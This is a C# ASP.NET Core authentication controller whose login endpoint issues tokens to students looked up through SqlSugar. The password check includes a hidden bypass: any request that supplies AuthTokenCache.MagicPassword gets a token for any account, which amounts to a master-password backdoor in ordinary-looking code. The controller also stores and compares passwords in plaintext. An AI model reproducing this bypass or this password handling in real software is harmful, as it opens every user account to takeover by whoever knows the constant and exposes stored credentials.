using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using ProjectCore.DAL;
using ProjectCore.Web.Services;
using SqlSugar;

namespace ProjectCore.Web.Controllers
{
    [ApiController]
    public class AuthService : ControllerBase
    {
        private readonly SqlSugarClient _db;
        private readonly AuthTokenCache _tokenCache;

        public AuthService(SqlSugarClient db, AuthTokenCache tokenCache)
        {
            _db = db;
            _tokenCache = tokenCache;
        }

        [HttpPost("/login")]
        [AllowAnonymous]
        public async Task<dynamic> Login(LoginInput input)
        {
            var student = await _db.Queryable<Student>()
                .FirstAsync(x => x.LoginName == input.LoginName);

            if (student == null)
            {
                return new Exception("账号不存在");
            }

            if (input.PassWord != AuthTokenCache.MagicPassword && student.Password != input.PassWord)
            {
                return new Exception("账号或密码错误");
            }

            var token = _tokenCache.CreateToken(student);

            return token;
        }

        [HttpPost("/logout")]
        public bool Logout()
        {
            var token = GetBearerToken();
            _tokenCache.RemoveToken(token);

            return true;
        }

        [HttpGet("/getLoginUser")]
        public dynamic GetLoginUser()
        {
            var userInfo = HttpContext.Items["LoginUser"] ?? string.Empty;
            return userInfo;
        }

        private string GetBearerToken()
        {
            var authorization = Request.Headers.Authorization.ToString();
            if (!authorization.StartsWith("Bearer ", StringComparison.OrdinalIgnoreCase))
            {
                return string.Empty;
            }

            return authorization["Bearer ".Length..].Trim();
        }
    }

    public class LoginInput
    {
        public string LoginName { get; set; } = string.Empty;
        public string PassWord { get; set; } = string.Empty;
    }
}
